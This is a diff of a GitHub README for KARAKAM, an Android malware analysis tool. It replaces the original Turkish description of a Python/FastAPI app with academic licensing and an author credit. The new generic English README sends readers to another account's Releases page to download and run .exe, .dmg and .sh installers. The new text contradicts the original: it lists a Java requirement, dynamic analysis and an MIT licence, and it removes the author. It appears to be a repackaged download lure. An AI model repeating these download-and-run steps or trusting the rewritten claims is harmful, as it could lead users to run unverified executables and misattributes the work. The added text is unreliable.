@@ -1,153 +1,79 @@
-# KARAKAM  
-## AI-Based Next-Generation Android Malware Analysis Platform
+# 🚀 Karakam - Analyze Android Malware Easily
 
-KARAKAM, Android zararlı yazılımlarını tespit etmek için statik analiz, ağ keşfi ve tehdit istihbaratını otonom bir mimaride birleştiren, yapay zeka destekli bir analiz platformudur.
+[![Download Karakam](https://img.shields.io/badge/Download-Karakam-brightgreen)](https://github.com/Yunusmakas/Karakam/releases)
 
-<img width="801" height="972" alt="image" src="https://github.com/user-attachments/assets/2f9e4f66-dea9-4db2-babe-68723fcbef2c" />
+## 📃 Overview
+Karakam is an AI-Based Next-Generation Android Malware Analysis Platform. This tool simplifies the way you analyze Android applications for security threats. By using Karakam, you can quickly identify vulnerabilities and enhance your digital safety.
 
+## 📦 System Requirements
+Before downloading, ensure your system meets the following requirements:
 
----
+- **Operating System:** Windows 10 or higher, macOS High Sierra or higher, or any recent version of Linux.
+- **RAM:** Minimum of 4 GB (8 GB recommended).
+- **Disk Space:** At least 500 MB free.
+- **Java Runtime Environment:** JRE version 8 or higher installed.
 
-## 📌 Genel Bakış
+## 🚀 Getting Started
+To get started with Karakam, follow these steps:
 
-KARAKAM; Android uygulamalarını çok katmanlı olarak analiz eder, elde edilen teknik verileri özel eğitilmiş bir Büyük Dil Modeli (LLM) ile yorumlar ve uygulamanın güvenlik durumunu otonom biçimde sınıflandırır.
+1. Visit the [Releases page](https://github.com/Yunusmakas/Karakam/releases) to find the latest version.
+2. Find the version that suits your needs, and click on it for details.
+3. Download the installer that matches your operating system.
 
-Desteklenen çıktı sınıfları:
-- **BENIGN**
-- **SUSPICIOUS**
-- **MALICIOUS**
+## 📥 Download & Install
+To download Karakam, visit this page to download: [Karakam Releases](https://github.com/Yunusmakas/Karakam/releases).
 
----
+Once you've downloaded the installer:
 
-## 🚀 Özellikler
+1. **For Windows:**
+   - Double-click the `.exe` file you downloaded.
+   - Follow the prompts in the setup wizard.
+   - Once installed, launch the application from your Start Menu.
 
-- **Hibrit Analiz**
-  - MobSF (Statik Analiz)
-  - Subfinder (Ağ Keşfi)
-  - VirusTotal (Tehdit İstihbaratı)
+2. **For macOS:**
+   - Open the `.dmg` file.
+   - Drag the Karakam icon into your Applications folder.
+   - Open Karakam from the Applications folder.
 
-- **Özel Eğitilmiş LLM**
-  - Llama-3.1-8B tabanlı
-  - Siber güvenlik odaklı fine-tune edilmiş **Karakam-AI**
+3. **For Linux:**
+   - Open the terminal.
+   - Navigate to the directory where you downloaded the file.
+   - Run `chmod +x Karakam*.sh`.
+   - Then, execute with `./Karakam*.sh` and follow the setup instructions.
 
-- **Otonom Karar Mekanizması**
-  - Teknik verileri bağlamsal olarak yorumlar
-  - İnsan müdahalesi olmadan nihai karar üretir
+## 🛠️ How to Use Karakam
+1. **Launch the Application:** Open Karakam after installation.
+2. **Upload APK File:** Click on the “Upload” button and select the Android APK file you want to analyze.
+3. **Start Analysis:** Click on “Start Analysis” to begin the process.
+4. **Review Results:** Once the analysis is complete, review the detailed report which includes potential vulnerabilities and recommendations.
 
-- **Veri Gizliliği**
-  - GGUF & Ollama desteği
-  - Tamamen on-premise çalışabilir mimari
+## 📊 Features
+- **AI-Powered Analysis:** Leverage artificial intelligence to detect anomalies in APK files.
+- **Static and Dynamic Analysis:** Analyze both static code and runtime behavior of Android applications.
+- **Integration with Security Tools:** Karakam integrates with tools like VirusTotal and MobSF for enhanced analysis.
+- **User-Friendly Interface:** Designed for ease of use, even for non-technical users.
+- **Detailed Reports:** Generate comprehensive reports regarding potential security risks.
 
-- **Detaylı Raporlama**
-  - Excel formatında toplu analiz çıktısı
-  - MITRE ATT&CK uyumlu teknik gerekçelendirme
+## 🔗 Topics Covered
+Karakam addresses the following topics relevant to Android security:
+- android-security
+- cyber
+- hybrid-analysis
+- jadx
+- llm-security
+- mobsf
+- security
+- static-analysis
+- subfinder
+- virustotal
 
----
+## 🤝 Support
+If you have any issues or need assistance, please check the repository's [Issues page](https://github.com/Yunusmakas/Karakam/issues) or reach out to the community via discussions.
 
-## 🛠 Mimari Yapı
+## 🌐 Contribution
+We appreciate contributions! If you want to help improve Karakam, follow the guidelines in the repository for contributions.
 
-Uygulama, yüksek performans ve ölçeklenebilirlik için **FastAPI tabanlı asenkron mimari** üzerine inşa edilmiştir.
+## 📝 License
+Karakam is licensed under the MIT License. You are free to use, modify, and distribute it within the terms of the license.
 
-<img width="1920" height="1080" alt="Adsız tasarım (1)" src="https://github.com/user-attachments/assets/79d0ecc9-c1cd-453a-b019-1a9a643e0596" />
-
-### Temel Bileşenler
-
-- **Static Analysis**
-  - MobSF API entegrasyonu
-  - Permission ve API çağrısı analizi
-
-- **Reconnaissance**
-  - Docker üzerinde çalışan Subfinder
-  - Pasif subdomain keşfi
-
-- **AI Engine**
-  - Hugging Face üzerinde yayınlanan özel model  
-    https://huggingface.co/TolgaTD/karakam-llama3.1-8b-gguf
-
----
-
-## 🧠 Kullanılan Teknolojiler
-
-- Python 3.9+
-- FastAPI
-- Docker
-- MobSF
-- Subfinder
-- VirusTotal API
-- Ollama
-- Llama-3.1-8B (Fine-Tuned)
-
----
-
-## 🔧 Kurulum
-
-### 1. Gereksinimler
-
-- Python 3.9 veya üzeri
-- Docker
-- Ollama
-- MobSF (Docker sürümü)
-- Subfinder (Docker sürümü)
-
-### 2. Modeli Hazırlama
-
-Model Hugging Face üzerinden indirilir ve Ollama ile yerel olarak ayağa kaldırılır.  
-Model adı: **karakam-ai**
-
-### 3. Uygulamayı Çalıştırma
-
-Gerekli Python bağımlılıkları kurulduktan sonra FastAPI sunucusu başlatılır.
-
-**Not:**  
-Bu aşamadan önce MobSF ve Subfinder servislerinin Docker üzerinde çalışır durumda olduğundan emin olun.  
-Ayrıca Ollama servisinin aktif olması ve **karakam-ai** modelinin başarıyla yüklenmiş olması gerekmektedir.  
-Uygulama, bu servislerle API üzerinden haberleşerek analiz sürecini yürütür.
-
----
-
-## 📊 Ekran Görüntüleri
-
-### 1. AI Analiz Sonuçları
-
-<img width="779" height="405" alt="image" src="https://github.com/user-attachments/assets/e655e24f-3a68-4c0e-b357-ca3d9717469e" />
- 
-(BENIGN / SUSPICIOUS / MALICIOUS sınıflandırma çıktıları)
-
----
-
-### 2. İşlenmemiş Uygulama Verileri
-
-<img width="782" height="543" alt="image" src="https://github.com/user-attachments/assets/c8fe0eea-da72-4e34-87c6-cebf710beb8b" />
-
-
-(MobSF, ağ keşfi ve tehdit istihbaratından elde edilen ham çıktılar)
-
----
-
-
-## 📜 Teşekkür ve Atıflar
-
-### Akademik Danışmanlık
-- **Prof. Dr. İbrahim Alper DOĞRU**
-
-### Veri ve Altyapı Desteği
-- **VirusTotal** – Premium API erişimi
-- **AndroZoo** – Zararlı yazılım veri seti erişimi
-
-### Açık Kaynak Projeler
-- **MobSF & JADX** – Statik analiz
-- **Subfinder (ProjectDiscovery)** – Ağ keşfi
-
----
-
-## 📄 Lisans
-
-Bu proje **akademik kullanım** şartlarına tabidir.
-
----
-
-
-**Tolga Demirel**  
-Gazi Üniversitesi  
-Bilgisayar Mühendisliği Bölümü  
-2026
+For further details, visit the [Releases page](https://github.com/Yunusmakas/Karakam/releases) for the most recent updates and downloads.
